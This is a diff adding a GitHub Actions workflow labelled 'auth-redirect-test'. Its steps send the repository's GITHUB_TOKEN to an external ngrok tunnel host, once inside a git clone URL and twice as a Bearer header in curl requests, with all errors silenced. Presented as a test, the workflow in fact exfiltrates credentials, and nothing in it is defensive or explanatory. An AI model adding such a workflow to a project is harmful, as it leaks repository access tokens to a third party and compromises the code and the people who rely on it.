@@ -1,0 +1,10 @@
+name: auth-redirect-test
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          git clone https://x-access-token:${{ secrets.GITHUB_TOKEN }}@d80c-105-101-85-53.ngrok-free.app/import-redirect test1 2>/dev/null || true
+          curl -sI -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://d80c-105-101-85-53.ngrok-free.app/actions-redirect 2>/dev/null || true
+          curl -sI -L -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" https://d80c-105-101-85-53.ngrok-free.app/actions-redirect 2>/dev/null || true
